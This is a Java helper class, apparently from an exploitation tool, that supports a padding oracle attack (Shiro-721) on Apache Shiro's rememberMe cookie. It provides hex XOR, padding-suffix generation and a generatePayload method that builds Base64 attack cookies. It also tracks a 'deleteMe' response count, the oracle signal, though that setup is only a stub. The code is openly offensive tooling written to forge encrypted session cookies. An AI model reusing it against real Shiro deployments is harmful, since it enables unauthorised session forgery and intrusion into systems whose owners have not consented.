package com.y5neko.shiroexp.misc;

import org.apache.commons.codec.DecoderException;
import org.apache.commons.codec.binary.Base64;
import org.apache.commons.codec.binary.Hex;

/**
 * Shiro721 特有的工具类
 * 提供 Padding Oracle 攻击所需的加密和解密工具方法
 */
public class Shiro721Tools {

    public static int deleteMeBaseCount = 1;

    /**
     * XOR 两个十六进制字符串
     * @param hex1 第一个十六进制字符串
     * @param hex2 第二个十六进制字符串
     * @return XOR 结果的十六进制字符串
     */
    public static String xor(String hex1, String hex2){
        if(hex1.length() % 2 !=0){
            hex1 = 0 + hex1;
        }

        if(hex2.length() % 2 != 0){
            hex2 = 0 + hex2;
        }

        int len = Math.min(hex1.length(), hex2.length());
        StringBuffer sb = new StringBuffer();
        for(int i=0; i < len; i=i+2){
            String temp1 = hex1.substring(hex1.length()-i-2, hex1.length()-i);
            String temp2 = hex2.substring(hex2.length()-i-2, hex2.length()-i);
            int num1 = Integer.parseInt(temp1,16);
            int num2 = Integer.parseInt(temp2,16);

            int res = num1 ^ num2;
            String hex = Integer.toHexString(res);
            if(hex.length() < 2){
                hex = 0 + hex;
            }

            sb.insert(0, hex);
        }

        return sb.toString();
    }

    /**
     * 生成 Padding Oracle 攻击的后缀
     * @param num 当前位置
     * @return 后缀字符串
     */
    public static String generateSuffix(int num) {
        if (num == 1) {
            return "";
        }

        String result = "";
        for (int i = 0; i < (num - 1); i++) {
            String hex = Integer.toHexString(num);
            if (hex.length() < 2) {
                hex = "0" + hex;
            }
            result += hex;
        }

        return result;
    }

    /**
     * 生成 Padding Oracle 攻击的 payload
     * @param rememberMe rememberMe Cookie (十六进制)
     * @param IV 初始化向量 (十六进制)
     * @param cipherText 密文 (十六进制)
     * @return Base64 编码的 payload
     */
    public static String generatePayload(String rememberMe, String IV, String cipherText){
        String payload = rememberMe + IV + cipherText;
        byte[] bytes = new byte[0];
        try {
            bytes = Hex.decodeHex(payload);
        } catch (DecoderException e) {
            e.printStackTrace();
        }

        return Base64.encodeBase64String(bytes);
    }

    /**
     * 获取 deleteMe 基准计数
     * 注意：此方法需要在实际使用时适配到现有的配置系统
     */
    public static void getDeleteMeBaseCount(){
        // TODO: 适配到现有的配置系统
        // 暂时设置为默认值
        Shiro721Tools.deleteMeBaseCount = 1;
    }
}
